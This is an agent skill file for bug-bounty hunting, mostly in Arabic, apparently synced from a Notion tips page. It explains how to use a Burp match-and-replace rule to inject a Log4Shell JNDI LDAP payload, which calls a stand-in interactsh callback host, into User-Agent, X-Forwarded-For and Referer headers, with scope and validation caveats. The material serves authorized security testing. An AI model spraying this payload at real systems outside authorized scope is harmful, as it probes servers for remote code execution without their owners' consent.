# SKILL: اكتشاف Log4Shell أوتوماتيكيًا عبر Match & Replace

**Skill id:** `tip/اكتشاف-log4shell-أوتوماتيكيًا-عبر-match-replace`  
**Category:** RCE  
**Rating:** ⭐ جيدة  
**Status:** Not started  
**Notion:** https://app.notion.com/p/3dddac31e88081018ddcd2d2a50c1d1e  

> **Authorized testing only.** LEAD until validated on accounts/objects you own. Never auto-confirm.

## When the agent should use this skill

- Hunting track involves: **RCE**
- Target signals match this technique
- Scope and testing envelope confirmed

## How It Works

لوج4شيل لسة من السنين لكن لسة lagacy systems لسة لسة معرضة لها. بدل ما تدور يدوي على كل input، اعمل match & replace rule في Burp يحقن payload الـ Log4Shell في كل request ملفوف أوتوماتيكيًا (زي User-Agent).

## Payload / Code

```
الـ payload الأساسي:
\$\{jndi\:ldap\://YOUR-INTERACTSH-URL/a\}

اضفه كـ match&replace في headers زي: User-Agent, X-Forwarded-For, Referer
```

## Source

Intigriti Official — 31 Bug Bounty Tips 2026 (Tip 28)

## Agent execution contract

1. Confirm asset is in authorized scope.
2. Baseline with an account/object you control.
3. Apply **one** mutation from the payload at a time.
4. Discriminate benign explanations (cache, public data, UI-only).
5. Classify as **LEAD** until unauthorized consequence is proven.
6. Stop if real third-party data appears beyond minimal evidence.
7. Hand off to report template only after validation checklist passes.

---
_Synced from Notion Bug Bounty Tips and Tricks · agent skill ready._
